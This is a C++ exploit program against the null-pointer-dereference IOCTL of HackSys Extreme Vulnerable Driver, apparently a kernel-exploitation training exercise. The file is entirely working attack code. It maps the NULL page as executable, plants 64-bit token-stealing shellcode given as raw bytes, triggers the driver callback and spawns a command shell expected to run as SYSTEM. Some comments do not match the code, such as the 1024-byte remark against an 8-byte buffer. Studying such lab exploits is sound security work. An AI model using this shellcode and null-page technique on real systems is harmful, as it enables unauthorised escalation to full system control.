#include <iostream>
#include <windows.h>
#include <psapi.h>

// QWORD is nicer!
typedef uint64_t QWORD;

// 
// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/d4drvif/nf-d4drvif-ctl_code
#define HACKSYS_EVD_IOCTL_NULL_POINTER_DEREFERENCE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x80A, METHOD_NEITHER, FILE_ANY_ACCESS)

//
// https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/HEVD/Windows/NullPointerDereference.h
// this is the struct that is being used for the Callback function
// typedef struct _NULL_POINTER_DEREFERENCE
// {
//    ULONG Value;
//    FunctionPointer Callback;
// } NULL_POINTER_DEREFERENCE, * PNULL_POINTER_DEREFERENCE;
//

#define HEVD_SYM_LINK "\\\\.\\HacksysExtremeVulnerableDriver"

#define ARRAY_SIZE 1024

QWORD GetKernelBase()
{
    LPVOID drivers[ARRAY_SIZE];
    DWORD cbNeeded;
    EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded);

    return (QWORD)drivers[0];
}

int main() {

    // get a handle to the driver using the Symbolic link
    HANDLE hDevice = CreateFileA(HEVD_SYM_LINK, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);

    // if CreateFileA fails the handle will be -0x1
    if (hDevice == (HANDLE)-0x1)
    {
        printf("[+] Driver handle: 0x%p\n", hDevice);
        printf("[!] Unable to get a handle to the driver.\n");
        return 1;
    }
    else
    {
        // token stealing shellcode - 64bit
        const unsigned char shellcode[] = { 0x50, 0x53, 0x51, 0x56, 0x57, 0x48, 0x31, 0xC0, 0x65, 0x48, 0x8B, 0x80, 0x88, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x40, 0x70, 0x49, 0x89, 0xC0, 0x41, 0xB9, 0x04, 0x00, 0x00, 0x00, 0x4D, 0x8B, 0x80, 0x88, 0x01, 0x00, 0x00, 0x49, 0x81, 0xE8, 0x88, 0x01, 0x00, 0x00, 0x4D, 0x39, 0x88, 0x80, 0x01, 0x00, 0x00, 0x75, 0xE9, 0x49, 0x8B, 0x88, 0x08, 0x02, 0x00, 0x00, 0x80, 0xE1, 0xF0, 0x48, 0x89, 0x88, 0x08, 0x02, 0x00, 0x00, 0x5F, 0x5E, 0x59, 0x5B, 0x58 };

        // Get a pointer to the internal ZwAllocateVirtualMemory call
        typedef NTSTATUS(*WINAPI ZwAllocateVirtualMemory)(
            _In_    HANDLE    ProcessHandle,
            _Inout_ PVOID* BaseAddress,
            _In_    ULONG_PTR ZeroBits,
            _Inout_ PSIZE_T   RegionSize,
            _In_    ULONG     AllocationType,
            _In_    ULONG     Protect
            );

        ZwAllocateVirtualMemory _ZwAllocateVirtualMemory = (ZwAllocateVirtualMemory)GetProcAddress(LoadLibraryA("ntdll.dll"), "ZwAllocateVirtualMemory");

        // get a reference to the NULL page
        PVOID nullPage = (PVOID)1;
        SIZE_T regionSize = 4096;

        // allocate commitable, executable memory
        NTSTATUS alloc = _ZwAllocateVirtualMemory(GetCurrentProcess(), &nullPage, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        // copy the shellcode in to the memory
        RtlMoveMemory((void*)0x100, shellcode, sizeof(shellcode));
        printf("[+] Shellcode copied to: 0x%p\n", 0x100);

        // set the callback address
        *(QWORD*)(0x8) = 0x100;
        printf("[+] Callback address written to the NULL page...\n");

        // not sure why the exploit is 1024 bytes
        char exploit[8];
        memset(exploit, 'A', sizeof(exploit));

        printf("[!] Press enter when ready...");
        getchar();

        printf("[+] Sending buffer to IOCTL: 0x%p...\n", HACKSYS_EVD_IOCTL_NULL_POINTER_DEREFERENCE);

        // interact with the driver
        DeviceIoControl(hDevice, HACKSYS_EVD_IOCTL_NULL_POINTER_DEREFERENCE, exploit, sizeof(exploit), NULL, 0, NULL, NULL);
        printf("[+] Hopefully the magic has happened...\n");
        printf("[+] Spawning new process..\n\n");

        // span a new command prompt
        system("cmd.exe");

        // close the driver handle
        CloseHandle(hDevice);
    }


    return 0;
}
